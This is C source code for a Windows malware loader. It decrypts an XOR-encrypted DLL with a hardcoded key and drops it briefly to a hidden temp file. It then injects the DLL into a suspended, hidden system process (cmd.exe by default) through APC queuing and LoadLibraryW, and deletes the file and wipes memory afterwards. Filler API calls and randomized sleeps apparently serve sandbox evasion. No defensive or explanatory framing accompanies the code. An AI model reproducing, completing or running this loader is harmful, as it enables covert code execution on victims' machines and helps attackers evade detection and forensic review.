#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

static BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};

static void Hammer(void) {
    WCHAR b[256]; DWORD l = 256; volatile int d = 0;
    for (int i = 0; i < 50; i++) {
        GetSystemDirectoryW(b, l); GetWindowsDirectoryW(b, l);
        GetTempPathW(l, b); GetTickCount(); d += (int)b[0];
    }
}

static DWORD FindThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    THREADENTRY32 te; te.dwSize = sizeof(te); DWORD tid = 0;
    if (Thread32First(snap, &te)) {
        do { if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; } }
        while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); return tid;
}

int main(int argc, char *argv[]) {
    const char *encFile = argc > 1 ? argv[1] : "agent.dll.enc";
    const char *proc    = argc > 2 ? argv[2] : "cmd.exe";

    Hammer(); Sleep(1500 + (GetTickCount() & 0xFFF)); Hammer();

    // 1. Read encrypted DLL from disk
    HANDLE hf = CreateFileA(encFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open: %s\n", encFile);
        return 1;
    }
    DWORD sz = GetFileSize(hf, NULL);
    BYTE *enc = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    BYTE *dll = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    DWORD rd;
    ReadFile(hf, enc, sz, &rd, NULL);
    CloseHandle(hf);
    printf("[+] Loaded encrypted DLL: %lu bytes\n", sz);

    // 2. Decrypt in memory
    for (DWORD i = 0; i < sz; i++)
        dll[i] = enc[i] ^ g_key[i % 16];
    HeapFree(GetProcessHeap(), 0, enc);
    printf("[+] Decrypted in memory\n");

    // 3. Write to temp file (exists for milliseconds)
    WCHAR tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    GetTempFileNameW(tmpPath, L"tmp", 0, tmpFile);

    HANDLE hw = CreateFileW(tmpFile, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    DWORD wr;
    WriteFile(hw, dll, sz, &wr, NULL);
    CloseHandle(hw);
    printf("[+] Wrote temp DLL: %S\n", tmpFile);

    // 4. Build target path
    char sysDir[MAX_PATH], targetPath[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    lstrcpyA(targetPath, sysDir);
    lstrcatA(targetPath, "\\");
    lstrcatA(targetPath, proc);

    // 5. Create suspended process
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, targetPath, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess: %lu\n", GetLastError());
        DeleteFileW(tmpFile);
        HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }
    printf("[+] PID: %lu\n", pi.dwProcessId);

    // 6. Write DLL path (temp file) to target
    DWORD ps = (DWORD)(wcslen(tmpFile) + 1) * sizeof(WCHAR);
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, ps,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { TerminateProcess(pi.hProcess, 0); goto cleanup; }
    WriteProcessMemory(pi.hProcess, mem, tmpFile, ps, NULL);

    // 7. QueueAPC + Resume
    LPVOID pLL = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
    DWORD tid = FindThread(pi.dwProcessId);
    if (!tid) tid = pi.dwThreadId;
    HANDLE hTh = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
    if (!hTh) { TerminateProcess(pi.hProcess, 0); goto cleanup; }

    Hammer();
    QueueUserAPC((PAPCFUNC)pLL, hTh, (ULONG_PTR)mem);
    ResumeThread(hTh);
    printf("[+] Injected\n");

    Sleep(3000);
    CloseHandle(hTh); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

cleanup:
    // 8. Delete temp file + clear memory
    DeleteFileW(tmpFile);
    SecureZeroMemory(dll, sz);
    HeapFree(GetProcessHeap(), 0, dll);
    VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
    printf("[+] Temp file deleted, memory cleared. Done.\n");
    return 0;
}
